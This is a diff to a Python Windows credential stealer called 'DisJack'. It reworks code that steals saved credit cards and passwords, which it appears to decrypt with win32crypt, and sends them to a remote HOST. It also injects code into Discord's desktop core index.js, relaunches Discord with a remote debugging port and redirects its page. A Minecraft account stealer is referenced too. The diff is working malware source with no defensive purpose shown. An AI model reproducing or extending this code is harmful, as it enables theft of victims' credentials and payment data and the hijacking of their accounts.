@@ -3,12 +3,11 @@
 
 # Originally created by github.com/rpie
 # Changes I made: Organized project a tiny bit more, also changed some global names
-# and decided to clarify some comments.
+# and decided to clarify some comments, fixed some bad code.
 
 import ctypes
 import os
 import subprocess
-import time
 import re
 import requests
 import sys
@@ -17,10 +16,10 @@ import win32crypt
 import shutil
 import json
 import random
-import string
 import PyChromeDevTools
 
 from colorama import Fore
+from string import ascii_uppercase
 
 
 """ Global variables """
@@ -59,7 +58,7 @@ class SQLite3Connection:
 		try:
 			self.connection = sqlite3.connect(path)
 			self.cursor = self.connection.cursor()
-		except:
+		except: # Bad code practice -- HellSec fix this?
 			pass
 
 	def run(self, query):
@@ -71,7 +70,7 @@ class SQLite3Connection:
 
 class SQLite3LockedConnection:
 	def __init__(self,path):
-		self.path = shutil.copy(path,os.getcwd() + "\\" + "".join(random.choice(string.ascii_uppercase)) +".bak")
+		self.path = shutil.copy(path,os.getcwd() + "\\" + "".join(random.choice(ascii_uppercase)) +".bak")
 		self.connection = SQLite3Connection(self.path)
 
 	def run(self,query):
@@ -169,30 +168,6 @@ def MinecraftStealer():
 
     return accounts
 
-def illegal():
-    sender = Sender(HOST)
-
-    cs = CardStealer()
-    ps = PasswordStealer()
-    sc = cs.steal()
-    sp = ps.steal()
-
-    data = {"from": "DisJack"}
-
-    if sc:
-        data["credit_cards"] = sc
-    if sp:
-        data["passwords"] = sp
-
-    sender.send(data)
-
-def isAdmin():
-    try: AdminStatus = os.getuid() == 0
-    except AttributeError: AdminStatus = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if DEBUG:
-        print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Admin: {AdminStatus}')
-    return AdminStatus
-
 def RunCMD(command, wait = False):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
     if wait: process.wait()
@@ -222,8 +197,6 @@ def findEnd(userName):
     latestVersion = "app-" + versions[len(versions) - 1]
 
     inject(f'C:\\Users\\{userName}\AppData\Local\Discord\\{latestVersion}\modules\discord_desktop_core-1\discord_desktop_core\index.js')
-    time.sleep(2)
-
     RunCMD(f'C:\\Users\\{userName}\AppData\Local\Discord\\{latestVersion}\Discord.exe --remote-debugging-port=9223')
 
 
@@ -277,7 +250,17 @@ def replacePage():
     	chrome.Page.navigate(url=str(REDIRECT))
 
 def main():
-    illegal()
+    stolen_cards = CardStealer().steal()
+    stolen_passwords = PasswordStealer().steal()
+    message = {"from": "DisJack"}
+
+    if stolen_cards:
+        message["credit_cards"] = stolen_cards
+    if stolen_passwords:
+        message["passwords"] = stolen_passwords
+
+    Sender(HOST).send(message)
+
     findEnd(USERNAME)
     replacePage()
 
